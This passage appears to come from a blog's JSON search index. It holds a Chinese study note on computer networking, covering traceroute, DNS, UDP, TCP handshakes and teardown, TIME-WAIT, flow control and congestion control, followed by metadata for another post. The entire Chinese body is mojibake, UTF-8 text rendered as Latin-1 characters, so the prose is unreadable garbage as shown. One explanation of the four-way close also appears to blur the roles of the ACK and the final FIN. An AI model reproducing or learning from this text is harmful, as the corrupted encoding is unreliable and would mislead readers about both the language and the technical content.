ä¸€ä¸ªä¸»æœºä¸å¯è¾¾çš„ICMPæ•°æ®æŠ¥ç»™ä¸»æœºã€‚ä¸»æœºæ”¶åˆ°è¿™ä¸ªæ•°æ®æŠ¥ä»¥åå†å‘ä¸€ä¸ªTTL=2çš„UDPæ•°æ®æŠ¥ç»™ç›®çš„ä¸»æœºï¼Œç„¶ååˆºæ¿€ç¬¬äºŒä¸ªè·¯ç”±å™¨ç»™ä¸»æœºå‘ICMPæ•°æ® æŠ¥ã€‚å¦‚æ­¤å¾€å¤ç›´åˆ°åˆ°è¾¾ç›®çš„ä¸»æœºã€‚è¿™æ ·ï¼Œtracerouteå°±æ‹¿åˆ°äº†æ‰€æœ‰çš„è·¯ç”±å™¨IPã€‚ DNSDNSï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰ï¼Œå› ç‰¹ç½‘ä¸Šä½œä¸ºåŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œèƒ½å¤Ÿä½¿ç”¨æˆ·æ›´æ–¹ä¾¿çš„è®¿é—®äº’è”ç½‘ï¼Œè€Œä¸ç”¨å»è®°ä½èƒ½å¤Ÿè¢«æœºå™¨ç›´æ¥è¯»å–çš„IPæ•°ä¸²ã€‚é€šè¿‡ä¸»æœºåï¼Œæœ€ç»ˆå¾—åˆ°è¯¥ä¸»æœºåå¯¹åº”çš„IPåœ°å€çš„è¿‡ç¨‹å«åšåŸŸåè§£æï¼ˆæˆ–ä¸»æœºåè§£æï¼‰ã€‚DNSåè®®è¿è¡Œåœ¨UDPåè®®ä¹‹ä¸Šï¼Œä½¿ç”¨ç«¯å£å·53ã€‚ è¿è¾“å±‚åè®®è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ç½‘ç»œçš„è¾¹ç¼˜éƒ¨åˆ†çš„ä¸¤ä¸ªä¸»æœºä½¿ç”¨ç½‘ç»œçš„æ ¸å¿ƒéƒ¨åˆ†çš„åŠŸèƒ½è¿›è¡Œç«¯åˆ°ç«¯é€šä¿¡æ—¶ï¼Œåªæœ‰ä¸»æœºçš„åè®®æ ˆæ‰æœ‰è¿è¾“å±‚ï¼Œç½‘ç»œæ ¸å¿ƒéƒ¨åˆ†ä¸­çš„è·¯ç”±å™¨åœ¨è½¬å‘åˆ†ç»„æ—¶åªç”¨åˆ°ä¸‹ä¸‰å±‚çš„åŠŸèƒ½ç«¯åˆ°ç«¯çš„é€šä¿¡æ˜¯åº”ç”¨è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚è¿è¾“å±‚çš„ä½œç”¨å¤ç”¨(multiplexing)ï¼šæŒ‡åœ¨å‘é€æ–¹ä¸åŒçš„åº”ç”¨è¿›ç¨‹éƒ½å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªè¿è¾“å±‚åè®®ä¼ é€æ•°æ®åˆ†ç”¨(demultiplexing)ï¼šæŒ‡æ¥æ”¶æ–¹çš„è¿è¾“å±‚åœ¨å‰¥å»æŠ¥æ–‡çš„é¦–éƒ¨åèƒ½å¤ŸæŠŠè¿™äº›æ•°æ®æ­£ç¡®äº¤ä»˜åˆ°ç›®çš„åº”ç”¨è¿›ç¨‹è¿è¾“å±‚å’Œç½‘ç»œå±‚åŒºåˆ«ç½‘ç»œå±‚æ˜¯ä¸ºä¸»æœºä¹‹é—´æä¾›é€»è¾‘é€šä¿¡ï¼Œè€Œè¿è¾“å±‚ä¸ºåº”ç”¨è¿›ç¨‹ä¹‹é—´æä¾›ç«¯åˆ°ç«¯çš„é€»è¾‘é€šä¿¡ï¼›è¿è¾“å±‚è¦å¯¹æ”¶åˆ°çš„æŠ¥æ–‡è¿›è¡Œå·®é”™æ£€æµ‹ è¿è¾“å±‚ä¸¤ä¸ªåè®®ä¸»è¦çš„åè®®ï¼šTCPã€UDP UDPåè®® ç”¨æˆ·æ•°æ®æŠ¥åè®®UDP(User Datagram Protocol)ä¸»è¦åº”ç”¨ï¼šDNS/TFTP/RIP/BOOTP/DHCP/SNMP/NFS/IGMP ç‰¹ç‚¹ï¼š æ— è¿æ¥ ä½¿ç”¨å°½æœ€å¤§åŠªåŠ›äº¤ä»˜(å³ï¼Œä¸ä¿è¯å¯é äº¤ä»˜) é¢å‘æŠ¥æ–‡ï¼šåº”ç”¨å±‚äº¤ç»™UDPå¤šé•¿çš„æŠ¥æ–‡ï¼ŒUDPå°±ç…§æ ·å‘é€ï¼Œæ—¢ä¸åˆå¹¶ä¹Ÿä¸æ‹†åˆ†è‹¥æŠ¥æ–‡å¤ªé•¿ï¼ŒIPå±‚ä¼ é€æ—¶è¦è¿›è¡Œåˆ†ç‰‡ã€‚å› æ­¤åº”ç”¨è¿›ç¨‹è¦é€‰æ‹©åˆé€‚å¤§å°çš„æŠ¥æ–‡ UDPé¦–éƒ¨å¼€é”€å°ï¼Œåªæœ‰8å­—èŠ‚ï¼Œæ¯”TCPçš„20å­—èŠ‚è¦çŸ­ UDPæ•°æ®åŒ…ç»„æˆï¼šæ•°æ®å­—æ®µã€é¦–éƒ¨å­—æ®µé¦–éƒ¨å­—æ®µå…±8å­—èŠ‚ï¼šæºç«¯å£ã€ç›®çš„ç«¯å£ã€é•¿åº¦ã€æ£€éªŒå’Œ ç«¯å£ä¸å¯è¾¾å¦‚æœæ¥æ”¶æ–¹UDPå‘ç°æŠ¥æ–‡ä¸­çš„ç›®çš„ç«¯å£å·ä¸æ­£ç¡®(ä¸å­˜åœ¨å¯¹åº”äºè¯¥ç«¯å£å·çš„åº”ç”¨è¿›ç¨‹)ï¼Œå°±ä¸¢å¼ƒè¯¥æŠ¥æ–‡å¹¶ç”±ICMPå‘é€ç«¯å£ä¸å¯è¾¾å·®é”™æŠ¥æ–‡ç»™å‘é€æ–¹ ä¼ªé¦–éƒ¨ï¼šåªæœ‰åœ¨è®¡ç®—æ£€éªŒå’Œæ—¶ï¼Œä¸´æ—¶æ·»åŠ åœ¨UDPç”¨æˆ·æ•°æ®æŠ¥å‰é¢çš„æ•°æ®ï¼Œç”±æ­¤è®¡ç®—æ£€éªŒå’Œã€‚ä¼ªé¦–éƒ¨æ—¢ä¸å‘ä¸‹ä¼ é€ï¼Œä¹Ÿä¸å‘ä¸Šé€’äº¤ã€‚ TCPåè®® åº”ç”¨ï¼šSMTP/TELNET/HTTP/FTP ç‰¹ç‚¹ï¼š1.é¢å‘è¿æ¥çš„è¿è¾“å±‚åè®®2.æ¯ä¸€æ¡TCPè¿æ¥åªèƒ½æœ‰ä¸¤ä¸ªç«¯ç‚¹ï¼Œæ¯ä¸€æ¡TCPè¿æ¥åªèƒ½æ˜¯ç‚¹å¯¹ç‚¹çš„3.TCPæä¾›å¯é äº¤ä»˜çš„æœåŠ¡4.æä¾›å…¨åŒå·¥é€šä¿¡5.é¢å‘å­—èŠ‚æµï¼šè™½ç„¶åº”ç”¨ç¨‹åºå’ŒTCPçš„äº¤äº’æ˜¯ä¸€æ¬¡ä¸€ä¸ªæ•°æ®å—ï¼Œä½†TCPæŠŠåº”ç”¨ç¨‹åºäº¤ä¸‹æ¥çš„æ•°æ®çœ‹æˆä»…ä»…æ˜¯ä¸€è¿ä¸²çš„æ— ç»“æ„çš„å­—èŠ‚æµã€‚ TCPæ ¹æ®å¯¹æ–¹ç»™å‡ºçš„çª—å£å€¼å’Œå½“å‰ç½‘ç»œæ‹¥å¡ç¨‹åº¦æ¥å†³å®šä¸€ä¸ªæŠ¥æ–‡æ®µåº”åŒ…å«å¤šå°‘ä¸ªå­—èŠ‚ TCPè¿æ¥çš„ç«¯ç‚¹æ˜¯å¥—æ¥å­—ï¼Œå³(IPåœ°å€:ç«¯å£å·) åœæ­¢ç­‰å¾…åè®®â€œè¶…æ—¶é‡ä¼ â€ï¼šAåªè¦è¶…è¿‡ä¸€æ®µæ—¶é—´æ²¡æœ‰æ”¶åˆ°ç¡®è®¤ï¼Œå°±è®¤ä¸ºåˆšæ‰å‘é€çš„åˆ†ç»„ä¸¢å¤±äº†ï¼Œå› è€Œé‡ä¼ ç­¾åå‘é€è¿‡çš„åˆ†ç»„ã€‚éœ€è¦è®¾ç½®è¶…æ—¶è®¡æ—¶å™¨å¯¹äºè¿Ÿåˆ°çš„ç¡®è®¤ï¼ŒBä¼š(1)ä¸¢å¼ƒè¿™ä¸ªé‡å¤çš„åˆ†ç»„M2ï¼Œä¸å‘ä¸Šå±‚äº¤ä»˜ã€‚(2)å‘Aå‘é€ç¡®è®¤ç¼ºç‚¹ï¼šä¿¡é“åˆ©ç”¨ç‡å¤ªä½ è¿ç»­ARQåè®®å®šä¹‰ï¼šå‘é€æ–¹æ¯æ”¶åˆ°ä¸€ä¸ªç¡®è®¤ï¼Œå°±æŠŠå‘é€çª—å£å‘å‰æ»‘è¡Œä¸€ä¸ªåˆ†ç»„çš„ä½ç½®ã€‚æ¥æ”¶æ–¹ä¸€èˆ¬éƒ½é‡‡ç”¨ç´¯è®¡ç¡®è®¤çš„æ–¹å¼ã€‚å³ï¼šæ¥æ”¶æ–¹åœ¨æ”¶åˆ°å‡ ä¸ªåˆ†ç»„åï¼Œå¯¹æŒ‰åºåˆ°è¾¾çš„æœ€åä¸€ä¸ªåˆ†ç»„å‘é€ç¡®è®¤ã€‚è¡¨ç¤ºåˆ°è¿™ä¸ªåˆ†ç»„ä¸ºæ­¢çš„æ‰€æœ‰åˆ†ç»„éƒ½å·²ç»æ­£ç¡®æ”¶åˆ°äº†ã€‚ TCPæŠ¥æ–‡æ ¼å¼ ä¸‰æ¬¡æ¡æ‰‹TCPåœ¨ä¼ è¾“ä¹‹å‰ä¼šè¿›è¡Œä¸‰æ¬¡æ²Ÿé€šï¼Œä¸€èˆ¬ç§°ä¸ºâ€œä¸‰æ¬¡æ¡æ‰‹â€ï¼Œä¼ å®Œæ•°æ®æ–­å¼€çš„æ—¶å€™è¦è¿›è¡Œå››æ¬¡æ²Ÿé€šï¼Œä¸€èˆ¬ç§°ä¸ºâ€œå››æ¬¡æŒ¥æ‰‹â€ã€‚ å…·ä½“æµç¨‹ï¼š1.æœ€åˆçŠ¶æ€ï¼šAå’ŒBçš„TCPè¿›ç¨‹éƒ½å¤„äºCLOSEDçŠ¶æ€2.Bçš„TCPæœåŠ¡å™¨è¿›ç¨‹å…ˆåˆ›å»ºä¼ è¾“æ§åˆ¶å—TCBï¼Œå‡†å¤‡æ¥å—å®¢æˆ·è¿›ç¨‹çš„è¿æ¥è¯·æ±‚ã€‚ç„¶åæœåŠ¡å™¨è¿›ç¨‹å¤„äºLISTENçŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·çš„è¿æ¥è¯·æ±‚3.Açš„TCPå®¢æˆ·è¿›ç¨‹åˆ›å»ºä¼ è¾“æ§åˆ¶æ¨¡å—TCBï¼Œç„¶åå‘Bå‘å‡ºè¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µï¼Œé¦–éƒ¨çš„åŒéƒ¨ä½SYN=1ï¼ŒåŒæ—¶é€‰æ‹©ä¸€ä¸ªåˆå§‹åºå·seq=xè¿™æ—¶ï¼ŒTCPå®¢æˆ·è¿›ç¨‹è¿›å…¥SYN-SENT(åŒæ­¥å·²å‘é€)çŠ¶æ€4.Bæ”¶åˆ°è¿æ¥è¯·æ±‚åï¼Œå¦‚æœåŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å‘Aå‘é€ç¡®è®¤ã€‚ç¡®è®¤æŠ¥æ–‡ä¸­SYN=1,ACK=1ï¼Œç¡®è®¤å·ack=x+1åŒæ—¶é€‰æ‹©ä¸€ä¸ªè‡ªå·±çš„åˆå§‹åºå·seq=yï¼ŒæœåŠ¡å™¨è¿›ç¨‹è¿›å…¥SYN-RCVD(åŒæ­¥æ”¶åˆ°)çŠ¶æ€ã€‚5.TCPå®¢æˆ·ç«¯æ”¶åˆ°Bçš„ç¡®è®¤åï¼Œè¿˜è¦å‘Bå‘é€ç¡®è®¤ï¼Œç¡®è®¤æŠ¥æ–‡ACK=1,ç¡®è®¤å·ack=y+1ï¼Œè‡ªå·±çš„åºå·seq=x+1ã€‚è¿™æ—¶ï¼ŒTCPè¿æ¥å»ºç«‹ï¼ŒAè¿›å…¥ESTABLISHEDçŠ¶æ€6.Bæ”¶åˆ°Açš„ç¡®è®¤åï¼Œä¹Ÿè¿›å…¥ESTABLISHEDçŠ¶æ€ å››æ¬¡æŒ¥æ‰‹img å…·ä½“æµç¨‹ï¼š1.åˆå§‹çŠ¶æ€ï¼šAå’ŒBéƒ½å¤„äºESTABLISHEDçŠ¶æ€2.Aå…ˆå‘TCPå‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µï¼Œå¹¶åœæ­¢å‘é€æ•°æ®ï¼Œä¸»åŠ¨å…³é—­TCPè¿æ¥ã€‚æŠ¥æ–‡æ®µä¸­FIN=1ï¼Œåºå·seq=u(å·²ä¼ é€è¿‡çš„æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„åºå·åŠ 1)ï¼Œè¿™æ—¶Aè¿›å…¥FIN-WAIT-1(ç»ˆæ­¢ç­‰å¾…1)çŠ¶æ€ï¼Œç­‰å¾…Bç¡®è®¤ã€‚3.Bæ”¶åˆ°é‡Šæ”¾æŠ¥æ–‡åå³å‘å‡ºç¡®è®¤ï¼Œç¡®è®¤å·ack=u+1,å­—èŠ‚åºå·æ˜¯v(Bå‰é¢å·²ä¼ é€æ•°æ®æœ€åä¸€ä¸ªå­—èŠ‚åºå·+1)ï¼ŒBè¿›å…¥CLOSE-WAIT(å…³é—­ç­‰å¾…)çŠ¶æ€ã€‚ è¿™æ—¶çš„TCPå¤„äºåŠå…³é—­çŠ¶æ€ã€‚å³ï¼šä»Båˆ°Açš„æ–¹å‘çš„è¿æ¥å¹¶æœªå…³é—­ã€‚4.Aæ”¶åˆ°ç¡®è®¤åï¼Œè¿›å…¥FIN-WAIT-2(ç»ˆæ­¢ç­‰å¾…2)çŠ¶æ€ï¼Œç­‰å¾…Bå‘å‡ºçš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µ5.è‹¥Bæ²¡æœ‰éœ€è¦å‘é€çš„æ•°æ®ï¼Œå°±é€šçŸ¥TCPé‡Šæ”¾è¿æ¥ï¼ŒFIN=1,é€‰æ‹©åºå·w,ack=u+1,æ­¤æ—¶Bè¿›å…¥LAST-ACK(æœ€åç¡®è®¤)çŠ¶æ€6.Aæ”¶åˆ°Bçš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µåï¼Œå¿…é¡»å¯¹æ­¤å‘å‡ºç¡®è®¤ï¼ŒACK=1,ack=w+1,seq=u+1ï¼ŒAè¿›å…¥TIME-WAIT(æ—¶é—´ç­‰å¾…)çŠ¶æ€7.ç»è¿‡æ—¶é—´ç­‰å¾…è®¡æ—¶å™¨(TIME-WAIT timer)è®¾ç½®çš„æ—¶é—´2MSLåï¼ŒAè¿›å…¥CLOSEDçŠ¶æ€ TIME-WAITçŠ¶æ€ä¸ºä»€ä¹ˆå¿…é¡»ç­‰å¾…2MSLæ—¶é—´ï¼Ÿ ä¸ºäº†ä¿è¯Aå‘é€çš„æœ€åä¸€ä¸ªACKæŠ¥æ–‡æ®µèƒ½å¤Ÿåˆ°è¾¾Bã€‚ï¼ˆBæ”¶ä¸åˆ°Aå‘é€çš„ACKæ—¶ä¼šé‡ä¼ å…³é—­çš„æŠ¥æ–‡ï¼Œå› æ­¤Aéœ€è¦ç­‰å¾…å…¶å‘é€çš„ACKæ˜¯å¦æˆåŠŸï¼‰ é˜²æ­¢å·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µå‡ºç°åœ¨æœ¬è¿æ¥ä¸­ã€‚ TCPæµé‡æ§åˆ¶ å®šä¹‰ï¼šè®©å‘é€æ–¹çš„å‘é€é€Ÿç‡ä¸è¦å¤ªå¿«ï¼Œè¦è®©æ¥æ”¶æ–¹æ¥å¾—åŠæ¥æ”¶ã€‚ æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶å‘é€æ–¹çš„å‘é€çª—å£ä¸èƒ½è¶…è¿‡æ¥æ”¶æ–¹ç»™å‡ºçš„æ¥æ”¶çª—å£çš„æ•°å€¼ã€‚(TCPçš„çª—å£å•ä½æ˜¯å­—èŠ‚ï¼Œä¸æ˜¯æŠ¥æ–‡æ®µ) è§£å†³æ­»é”ï¼šTCPä¸ºæ¯ä¸€ä¸ªè¿æ¥è®¾ä¸€ä¸ªæŒç»­è®¡æ—¶å™¨ã€‚åªè¦TCPè¿æ¥çš„ä¸€æ–¹æ”¶åˆ°å¯¹æ–¹çš„é›¶çª—å£é€šçŸ¥ï¼Œå°±å¯åŠ¨æŒç»­è®¡æ—¶å™¨ã€‚è‹¥æŒç»­è®¡æ—¶å™¨è®¾ç½®çš„æ—¶é—´åˆ°æœŸï¼Œå°±å‘é€ä¸€ä¸ªé›¶çª—å£æ¢æµ‹æŠ¥æ–‡æ®µ(ä»…æºå¸¦1å­—èŠ‚æ•°æ®)ï¼Œå¯¹æ–¹å°±åœ¨ç¡®è®¤è¿™ä¸ªæ¢æµ‹æŠ¥æ–‡æ®µæ—¶ç»™å‡ºç°åœ¨çš„çª—å£å€¼ã€‚ TCPæ‹¥å¡æ§åˆ¶ å®šä¹‰ï¼šè®¡ç®—æœºç½‘ç»œä¸­çš„å¸¦å®½ã€äº¤æ¢èŠ‚ç‚¹çš„ç¼“å­˜å’Œå¤„ç†æœºç­‰éƒ½æ˜¯ç½‘ç»œèµ„æºã€‚åœ¨æŸæ®µæ—¶é—´ï¼Œè‹¥å¯¹ç½‘ç»œä¸­æŸä¸€èµ„æºçš„éœ€æ±‚è¶…è¿‡äº†è¯¥èµ„æºæ‰€èƒ½æä¾›çš„å¯ç”¨éƒ¨åˆ†ï¼Œç½‘ç»œçš„æ€§èƒ½å°±è¦å˜åï¼Œè¿™ç§æƒ…å†µå«æ‹¥å¡ã€‚ ç®€å•çš„é€šè¿‡å¢åŠ ä¸€äº›èµ„æºï¼Œæ¯”å¦‚æŠŠç»“ç‚¹ç¼“å­˜çš„å­˜å‚¨ç©ºé—´æ‰©å¤§ï¼Œæˆ–æŠŠé“¾è·¯æ›´æ¢ä¸ºæ›´é«˜é€Ÿç‡çš„é“¾è·¯ï¼Œæˆ–æŠŠç»“ç‚¹å¤„ç†æœºçš„è¿ç®—é€Ÿåº¦æä¾›ï¼Œå¹¶ä¸èƒ½è§£å†³ç½‘ç»œæ‹¥å¡é—®é¢˜ã€‚å› ä¸ºé—®é¢˜çš„å®è´¨æ˜¯æ•´ä¸ªç³»ç»Ÿçš„å„ä¸ªéƒ¨åˆ†ä¸åŒ¹é…ï¼Œåªæœ‰æ‰€æœ‰éƒ¨åˆ†éƒ½å¹³è¡¡äº†ï¼Œé—®é¢˜æ‰èƒ½è§£å†³ã€‚ æ‹¥å¡æ§åˆ¶çš„å››ç§ç®—æ³•ï¼šæ»¡å¼€å§‹(slow-start)ã€æ‹¥å¡é¿å…(congestion avoidance)ã€å¿«é‡ä¼ (fast retransmit)ã€å¿«æ¢å¤(fast recovery) ä¸ºä»€ä¹ˆè¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ ä¸ºäº†é˜²æ­¢å·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡çªç„¶åˆä¼ é€åˆ°äº†æœåŠ¡ç«¯ï¼Œå› ä¸ºäº§ç”Ÿé”™è¯¯ã€‚å…·ä½“è§£é‡Šï¼š â€œå·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µâ€äº§ç”Ÿæƒ…å†µï¼šclient å‘å‡ºçš„ç¬¬ä¸€ä¸ªè¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µå¹¶æ²¡æœ‰ä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æŸä¸ªç½‘ç»œèŠ‚ç‚¹é•¿æ—¶é—´æ»ç•™ï¼Œå› æ­¤å¯¼è‡´å»¶è¯¯åˆ°è¿æ¥é‡Šæ”¾ä»¥åçš„æŸä¸ªæ—¶é—´æ‰åˆ°è¾¾ serviceã€‚å¦‚æœæ²¡æœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œé‚£ä¹ˆæ­¤æ—¶serveræ”¶åˆ°æ­¤å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µï¼Œå°±è¯¯è®¤ä¸ºæ˜¯ clientå†æ¬¡å‘å‡ºçš„ä¸€ä¸ªæ–°çš„è¿æ¥è¯·æ±‚ï¼Œäºæ˜¯å‘ client å‘å‡ºç¡®è®¤æŠ¥æ–‡æ®µï¼ŒåŒæ„å»ºç«‹è¿æ¥ï¼Œè€Œæ­¤æ—¶ client å¹¶æ²¡æœ‰å‘å‡ºå»ºç«‹è¿æ¥çš„æƒ…å†µï¼Œå› æ­¤å¹¶ä¸ä¼šç†ä¼šæœåŠ¡ç«¯çš„å“åº”ï¼Œè€Œserviceå°†ä¼šä¸€ç›´ç­‰å¾…clientå‘é€æ•°æ®ï¼Œå› æ­¤å°±ä¼šå¯¼è‡´è¿™æ¡è¿æ¥çº¿è·¯ç™½ç™½æµªè´¹ã€‚å¦‚æœæ­¤æ—¶å˜æˆä¸¤æ¬¡æŒ¥æ‰‹è¡Œä¸è¡Œï¼Ÿè¿™ä¸ªæ—¶å€™éœ€è¦æ˜ç™½å…¨åŒå·¥ä¸åŠåŒå·¥ï¼Œå†è¿›è¡Œå›ç­”ã€‚æ¯”å¦‚ï¼š ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼š Aç»™Bæ‰“ç”µè¯è¯´ï¼Œä½ å¯ä»¥å¬åˆ°æˆ‘è¯´è¯å—ï¼Ÿç¬¬äºŒæ¬¡æ¡æ‰‹ï¼š Bæ”¶åˆ°äº†Açš„ä¿¡æ¯ï¼Œç„¶åå¯¹Aè¯´ï¼š æˆ‘å¯ä»¥å¬å¾—åˆ°ä½ è¯´è¯å•Šï¼Œä½ èƒ½å¬å¾—åˆ°æˆ‘è¯´è¯å—ï¼Ÿç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼š Aæ”¶åˆ°äº†Bçš„ä¿¡æ¯ï¼Œç„¶åè¯´å¯ä»¥çš„ï¼Œæˆ‘è¦ç»™ä½ å‘ä¿¡æ¯å•¦ï¼åœ¨ä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼ŒAå’ŒBéƒ½èƒ½ç¡®å®šè¿™ä¹ˆä¸€ä»¶äº‹ï¼š æˆ‘è¯´çš„è¯ï¼Œä½ èƒ½å¬åˆ°ï¼› ä½ è¯´çš„è¯ï¼Œæˆ‘ä¹Ÿèƒ½å¬åˆ°ã€‚ è¿™æ ·ï¼Œå°±å¯ä»¥å¼€å§‹æ­£å¸¸é€šä¿¡äº†ï¼Œå¦‚æœæ˜¯ä¸¤æ¬¡ï¼Œé‚£å°†æ— æ³•ç¡®å®šã€‚ ä¸ºä»€ä¹ˆè¦å››æ¬¡æŒ¥æ‰‹ï¼Ÿ TCP åè®®æ˜¯ä¸€ç§é¢å‘è¿æ¥ï¼Œå¯é ï¼ŒåŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚é€šä¿¡åè®®ã€‚TCP æ˜¯å…¨åŒå·¥æ¨¡å¼(åŒä¸€æ—¶åˆ»å¯ä»¥åŒæ—¶å‘é€å’Œæ¥æ”¶)ï¼Œè¿™å°±æ„å‘³ç€ï¼Œå½“ä¸»æœº1å‘å‡º FIN æŠ¥æ–‡æ®µæ—¶ï¼Œåªæ˜¯è¡¨ç¤ºä¸»æœº1å·²ç»“æ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œä¸»æœº1å‘Šè¯‰ä¸»æœº2ï¼Œå®ƒçš„æ•°æ®å·²ç»å…¨éƒ¨å‘é€å®Œæ¯•ï¼›ä½†æ˜¯ï¼Œè¿™ä¸ªæ—¶å€™ä¸»æœº1è¿˜æ˜¯å¯ä»¥æ¥å—æ¥è‡ªä¸»æœº2çš„æ•°æ®ï¼›å½“ä¸»æœº2è¿”å› ACKæŠ¥æ–‡æ®µæ—¶ï¼Œè¿™ä¸ªæ—¶å€™å°±è¡¨ç¤ºä¸»æœº2ä¹Ÿæ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œå°±ä¼šå‘Šè¯‰ä¸»æœº1ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œä¹‹åå½¼æ­¤å°±ä¼šä¸­æ–­è¿™æ¬¡TCPè¿æ¥ã€‚ TCPçš„ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå»ºç«‹è¿æ¥ã€‚å®¢æˆ·ç«¯å‘é€è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µï¼Œå¹¶å°†syn(æ ‡è®°ä½)è®¾ç½®ä¸º1ï¼ŒSquence Number(æ•°æ®åŒ…åºå·)(seq)ä¸ºx,æ¥ä¸‹æ¥ç­‰å¾…æœåŠ¡ç«¯ç¡®è®¤ï¼Œå®¢æˆ·ç«¯è¿›å…¥SYN_SENTçŠ¶æ€(è¯·æ±‚è¿æ¥)ï¼› ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ SYN æŠ¥æ–‡æ®µï¼Œå¯¹ SYN æŠ¥æ–‡æ®µè¿›è¡Œç¡®è®¤ï¼Œè®¾ç½® ack(ç¡®è®¤å·)ä¸º x+1(å³seq+1 ; åŒæ—¶è‡ªå·±è¿˜è¦å‘é€ SYN è¯·æ±‚ä¿¡æ¯ï¼Œå°† SYN è®¾ç½®ä¸º1, seqä¸º yã€‚æœåŠ¡ç«¯å°†ä¸Šè¿°æ‰€æœ‰ä¿¡æ¯æ”¾åˆ° SYN+ACK æŠ¥æ–‡æ®µä¸­ï¼Œä¸€å¹¶å‘é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥ SYN_RECVçŠ¶æ€ã€‚ SYN_RECVæ˜¯æŒ‡,æœåŠ¡ç«¯è¢«åŠ¨æ‰“å¼€å,æ¥æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„SYNå¹¶ä¸”å‘é€äº†ACKæ—¶çš„çŠ¶æ€ã€‚å†è¿›ä¸€æ­¥æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„ACKå°±è¿›å…¥ESTABLISHEDçŠ¶æ€ã€‚ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„ SYN+ACK(ç¡®è®¤ç¬¦) æŠ¥æ–‡æ®µï¼›ç„¶åå°† ACK è®¾ç½®ä¸º y+1,å‘æœåŠ¡ç«¯å‘é€ACKæŠ¥æ–‡æ®µï¼Œè¿™ä¸ªæŠ¥æ–‡æ®µå‘é€å®Œæ¯•åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½è¿›å…¥ESTABLISHED(è¿æ¥æˆåŠŸ)çŠ¶æ€ï¼Œå®ŒæˆTCP çš„ä¸‰æ¬¡æ¡æ‰‹ã€‚ ä¸Šé¢çš„è§£é‡Šå¯èƒ½æœ‰ç‚¹ä¸å¥½ç†è§£ï¼Œç”¨ã€Šå›¾è§£HTTPã€‹ä¸­çš„ä¸€å‰¯æ’å›¾ å¸®åŠ©å¤§å®¶ã€‚ æœ€åå†çœ‹ä¸€ä¸‹å®Œæ•´çš„è¿‡ç¨‹ï¼š img å¦‚æœæœ‰å¤§é‡çš„è¿æ¥ï¼Œæ¯æ¬¡åœ¨è¿æ¥ï¼Œå…³é—­éƒ½è¦ç»å†ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹ï¼Œè¿™æ˜¾ç„¶ä¼šé€ æˆæ€§èƒ½ä½ä¸‹ã€‚å› æ­¤ã€‚Http æœ‰ä¸€ç§å«åš é•¿è¿æ¥ï¼ˆkeepalive connectionsï¼‰ çš„æœºåˆ¶ã€‚å®ƒå¯ä»¥åœ¨ä¼ è¾“æ•°æ®åä»ä¿æŒè¿æ¥ï¼Œå½“å®¢æˆ·ç«¯éœ€è¦å†æ¬¡è·å–æ•°æ®æ—¶ï¼Œç›´æ¥ä½¿ç”¨åˆšåˆšç©ºé—²ä¸‹æ¥çš„è¿æ¥è€Œæ— éœ€å†æ¬¡æ¡æ‰‹ã€‚ img","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"è®¡ç®—æœºç½‘ç»œæ¦‚è®º","slug":"è®¡ç®—æœºç½‘ç»œ-1","date":"2020-07-24T21:28:42.000Z","updated":"2021-04-11T17:11:29.032Z","comments":true,"path":"è®¡ç®—æœºç½‘ç»œ-1/","link":"","permalink":"https://blog.kayleh.top/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-1/","excerpt":"è®¡ç®—æœºç½‘ç»œ","text":"è®¡ç®—æœºç½‘ç»œ 